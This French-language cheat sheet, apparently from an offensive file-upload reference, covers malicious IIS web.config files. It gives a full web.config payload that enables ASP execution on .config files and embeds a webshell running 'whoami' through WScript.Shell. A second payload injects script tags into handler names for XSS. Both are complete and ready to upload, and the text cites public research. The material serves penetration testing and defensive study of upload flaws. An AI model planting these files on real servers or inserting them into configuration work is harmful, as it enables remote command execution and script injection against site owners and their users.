# IIS : web.config

<img title="" src="logo.png" alt="" height="150">

**Facteur de risque** : RCE via ASP webshell, XSS

**Nom du fichier** : `web.config`

**Description** :

Les fichiers `web.config` sont des fichiers XML, qui contiennent les **paramètres de sécurités de Microsoft IIS Administration** (similaire au fichier `.htaccess` d'Apache). Ils permettent de personnaliser le site web ou un répertoire spécifique du site web.

Des attaques sont possibles si le réecriture ou la création du fichier `web.config` sont effectués par une personne mal intentionnée.

Toute modification du fichier `web.config` nécessite le **redémarrage** de Microsoft IIS Administration.

## Sommaire

- Remote Code Execution (RCE) via ASP webshell

- Cross-Site Scripting (XSS)

## Remote Code Execution (RCE) via ASP webshell

### Pré-requis

- IIS7 ou supérieur (voire IIS6 dans certaines conditions)

- Le serveur doit supporter ASP

- Le fichier doit être accesible

### Exploitation

Le code suivant permet d'exécuter la commande `whoami` :
**RCE/web.config**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!--
<%
Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-")
%>
-->
```

Du code ASP est ajouté entre `<%` et `%>`, le tout placé dans un commentaire pour que fichier reste valide en XML.

## Cross-Site Scripting (XSS)

### Pré-requis

- IIS7 ou supérieur

- Le serveur doit supporter ASP

### Exploitation

En téléversant un fichier `web.config` qui contient un "handler name" non valide une XSS est possible :

**XSS/web.config**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <!-- XSS by using *.config -->
         <add name="web_config_xss<script>alert('xss1')</script>" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="fooo" resourceType="Unspecified" requireAccess="None" preCondition="bitness64" />
         <!-- XSS by using *.test -->
         <add name="test_xss<script>alert('xss2')</script>" path="*.test" verb="*"  />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   <httpErrors existingResponse="Replace" errorMode="Detailed" />
   </system.webServer>
</configuration>
```

## References

Upload a web.config File for Fun & Profit : https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

Uploading web.config for Fun & Profit 2 : https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/

RCE by uploading a web.config : https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

## Todo
